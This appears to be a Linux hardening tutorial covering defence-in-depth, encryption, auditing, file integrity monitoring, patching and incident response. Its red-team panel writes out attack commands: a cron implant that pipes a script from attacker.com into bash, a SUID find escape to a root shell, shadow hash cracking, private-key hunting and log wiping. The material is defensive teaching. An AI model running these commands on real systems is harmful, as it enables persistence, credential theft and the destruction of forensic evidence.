🛡Linux Security Model — Defence-in-Depth ArchitecturePANEL 01
ℹLinux security is layered — no single control is sufficient. Each layer assumes the layer above it may be compromised. The goal: limit blast radius when one layer fails. This is the defence-in-depth model.

auditd · SIEM · AIDE · Tripwire · fail2ban · IDS/IPS · journald · alert pipelines
▼

▼

▼
LAYER 4 — Discretionary Access Control (DAC)
rwx permissions · ACLs · SUID/SGID audit · capabilities · sudo rules · chattr +i
▼
LAYER 3 — Identity & Authentication
PAM · SSH keys · MFA · password policy · account lockout · /etc/shadow SHA-512

Secure Boot · TPM · disk encryption (LUKS) · verified package signatures · CVE patch cadence
✓Security principle: An attacker who breaks through Layer 3 (auth) should still be stopped by Layer 5 (MAC). An attacker who exploits a kernel bug should still be limited by Layer 6 (network). No single layer is your last line of defence.

🔐Encryption — LUKS, TLS, GPG & Data at Rest/TransitPANEL 03
LUKS — Full Disk Encryption
LUKS (Linux Unified Key Setup) encrypts entire block devices. Implemented in kernel via dm-crypt. Key hierarchy:

Master Key (random 256/512-bit) → encrypts the data
Key Slots (up to 8) → each holds an encrypted copy of master key
Passphrase / keyfile / TPM → unlocks a key slot → reveals master key

Multiple slots = multiple unlock methods (passphrase + recovery key + TPM). Changing passphrase only changes key slot, not re-encrypting all data.
TLS — Encryption in Transit
TLS (Transport Layer Security) protects data between client and server. Minimum: TLS 1.2. Prefer: TLS 1.3 (faster handshake, no legacy crypto).

Certificate chain: Server cert → Intermediate CA → Root CA. Trust anchored in /etc/ssl/certs/

HSTS — HTTP Strict Transport Security: browser must use HTTPS.
OCSP Stapling — server provides cert revocation proof, no client lookup needed.

📋Logging & Auditing — auditd, journald, syslogPANEL 04
Linux Logging Architecture
Kernel ring buffer → dmesg / journalctl -k
auditd → kernel audit subsystem → /var/log/audit/audit.log
systemd-journald → structured binary log → journalctl
rsyslog / syslog-ng → route logs to files, remote, SIEM
/var/log/auth.log → PAM/SSH authentication events
/var/log/syslog → general system messages
/var/log/kern.log → kernel messages
/var/log/audit/ → auditd — most comprehensive
auditd — Kernel-Level Audit Trail
auditd records every system call, file access, network connection, process execution based on rules. It cannot be bypassed by root (kernel-level). Rules survive process restarts. Output is structured, signed, and append-only with chattr +a.

auditd is the gold standard for Linux compliance (PCI-DSS, HIPAA, SOC2, CIS). Every access to /etc/shadow, every sudo, every execve can be captured.

🔍File Integrity Monitoring — AIDE & TripwirePANEL 05
What Is FIM and Why It Matters
File Integrity Monitoring creates a cryptographic baseline of critical files (checksums, permissions, ownership, timestamps). Periodically compares against baseline — any change triggers an alert.

Detects: binary replacement (attacker replaces /usr/bin/ls with malware), config tampering, rootkit installation, and unauthorized persistence modifications.

Required by: PCI-DSS req 11.5, HIPAA, SOC2, CIS L2.
AIDE — Advanced Intrusion Detection Environment
AIDE monitors: SHA-256/512 checksums, file size, permissions (mode), UID/GID, number of links, mtime/ctime/atime, ACLs, xattrs.

Workflow: Initialize DB (known-good state) → Run check (compare current vs DB) → Alert on differences → Update DB after authorized changes.

Store the AIDE database offline or read-only media — an attacker with root can modify on-disk DB to cover tracks.

⚔Common Linux Attack Vectors — Red Team PlaybookPANEL 06
⛔All attack techniques below are documented for defensive and audit purposes. Understanding attacker methodology is the prerequisite for building effective defences. Every item maps to a MITRE ATT&CK technique.
① Privilege Escalation — SUID Binary Abuse T1548.001CRITICAL
Find SUID binaries, cross-reference with GTFOBins for known escape techniques. Example: sudo find → sudo find / -exec /bin/sh \; gives root shell.
find / -perm -4000 -type f 2>/dev/null | xargs -I{} sh -c 'echo {}; stat --printf="%U\n" {}'
② Credential Dumping — /etc/shadow T1003.008CRITICAL
Root access → read /etc/shadow → extract hashes → crack offline with hashcat. SHA-512 takes ~3-5 days on GPU for 8-char passwords. Weak passwords crack in minutes.
hashcat -m 1800 shadow_hashes.txt rockyou.txt # mode 1800 = sha512crypt
③ Persistence — Cron Job Implant T1053.003HIGH
Write a cron job that downloads and runs a payload every minute. Survives reboots. Hard to detect if hidden in system cron directories with disguised filenames.
echo '* * * * * root curl -s http://attacker.com/payload.sh | bash' > /etc/cron.d/.update
④ Persistence — Malicious systemd Unit T1543.002HIGH
Drop a systemd service unit that starts at boot, runs as root, phones home. Enabled via systemctl enable. Survives reboots. Looks like a legitimate service.
cat /etc/systemd/system/sysupdate.service # verify all units — especially new ones
⑤ Lateral Movement — SSH Key Theft T1552.004HIGH
Compromise one host → find ~/.ssh/id_rsa → use it to SSH to all servers that trust that key. One key often unlocks dozens of servers if key reuse is practiced.
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null # scan for private keys
⑥ Defense Evasion — Log Tampering T1070.002HIGH
Root clears /var/log/auth.log, truncates syslog, deletes bash history. Without log forwarding to remote SIEM, this erases all forensic evidence.
history -c; echo "" > /var/log/auth.log; > ~/.bash_history # attacker cleanup
⑦ Kernel Exploit — Local Privilege Escalation T1068CRITICAL
Unpatched kernel vulnerability allows any unprivileged user to gain root. Example: Dirty COW (CVE-2016-5195), DirtyCred (CVE-2022-2588). Often exploitable in under 60 seconds.
uname -r # check kernel version → compare to known CVE list via linux-exploit-suggester
⑧ C2 via DNS Tunneling T1071.004MEDIUM
Attacker encodes C2 traffic inside DNS queries (TXT records, subdomains). Bypasses firewalls that allow DNS. Exfiltrates data even through strict egress filtering.
tcpdump -i any port 53 | grep -E "TXT|long_subdomain" # detect unusual DNS patterns

🚫Fail2ban & Brute Force ProtectionPANEL 08
How Fail2ban Works
Fail2ban monitors log files (auth.log, nginx access.log, etc.) for patterns (failed logins, 404 storms, etc.). When a source IP exceeds a threshold, fail2ban creates an iptables/nftables rule to block that IP for a configurable duration.

Jails = log source + regex + threshold + action. Multiple jails can run simultaneously: sshd, nginx, postfix, dovecot, etc.
Rate Limiting with nftables
Kernel-level rate limiting is faster than fail2ban (no log parsing needed). Limits connections per source IP directly in netfilter. Effective against SYN floods and connection floods.

limit rate 10/minute per source IP on port 22 → maximum 10 SSH connection attempts per minute per IP.

🔄Patch Management — CVEs, Updates & Vulnerability ScanningPANEL 09
Why Patching Is Critical
The average time from CVE disclosure to exploit-in-the-wild is 15 days. Unpatched systems are the #1 root cause of breaches. The Linux kernel, glibc, OpenSSL, and OpenSSH are high-value targets — a vulnerability in any of these affects every process on the host.

CVSS score ≥ 9.0 = Critical — patch within 24 hours.
CVSS ≥ 7.0 = High — patch within 7 days.
CVSS ≥ 4.0 = Medium — patch within 30 days.
Patch Strategy — Enterprise
1. Subscribe to distro security advisories (USN for Ubuntu, RHSA for RHEL)
2. Automated unattended-upgrades for security patches only
3. Manual patching for kernel (requires reboot) — scheduled window
4. Vulnerability scanner (OpenVAS, Qualys, Nessus) for independent verification
5. Live kernel patching (kpatch, livepatch) for zero-downtime kernel updates

🚨Incident Response — Linux Compromise Triage PlaybookPANEL 11
ℹWhen a Linux server is suspected compromised, the order of operations matters. Preserve evidence first, contain second, eradicate third. Never reboot before collecting volatile data — /proc is lost on reboot.
1
COLLECT VOLATILE DATA (before reboot)
Capture: running processes, network connections, logged-in users, loaded modules, /proc/*/exe, environment variables, memory if possible.
ps aux; ss -tunp; who; lsmod; ls -la /proc/*/exe 2>/dev/null; env; w
2
CAPTURE LOGS (before attacker clears them)
Copy all logs to a secure location. Check if logs have been tampered (gaps, truncations, suspicious timestamps).
cp -a /var/log/ /forensics/logs/ && tar czf /forensics/logs.tar.gz /var/log/
3
IDENTIFY ATTACKER PRESENCE
Find unauthorized users, SSH keys, cron jobs, systemd units, SUID files, suspicious processes, deleted-but-running binaries.
awk -F: '$3==0' /etc/passwd; ls -la /proc/*/exe | grep deleted; find / -newer /etc/passwd -type f 2>/dev/null
4
CONTAIN — ISOLATE THE HOST
Block all external connections via firewall. Keep host up for forensics but cut off C2 communication. Block at network level if possible.
nft flush ruleset; nft add table inet block; nft add chain inet block input { type filter hook input priority 0; policy drop; }
5
DETERMINE SCOPE — LATERAL MOVEMENT CHECK
Check: which SSH keys exist on this host? Where could they access? What credentials were in memory? What data was accessible?
find / -name "authorized_keys" 2>/dev/null; find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
6
ERADICATE & RECOVER
Remove malware, backdoors, attacker accounts. If rootkit suspected: rebuild from known-good image. Patch the vulnerability used. Verify integrity with AIDE.
aide --check; lynis audit system; then rebuild if rootkit confirmed

◉Summary — Step 7 CompletePANEL 14
Defence-in-Depth
7 layers from physical to monitoring. No single control is sufficient. SSH key-only auth + firewall default-deny + auditd + SELinux + kernel hardening + AIDE + SIEM = production-grade posture. Each layer assumes the one above it may fail.
Detection & Forensics
auditd captures all syscalls. AIDE detects binary replacement. /proc/PID/exe reveals deleted binaries. ss shows C2 connections. Log forwarding to SIEM prevents evidence destruction. chattr +a protects log integrity.
Attacker Mindset
8 core attack paths: SUID abuse, credential dump, cron implant, systemd backdoor, SSH key theft, log tampering, kernel exploit, DNS tunneling. Each maps to MITRE ATT&CK. Know the attack to build the defence.
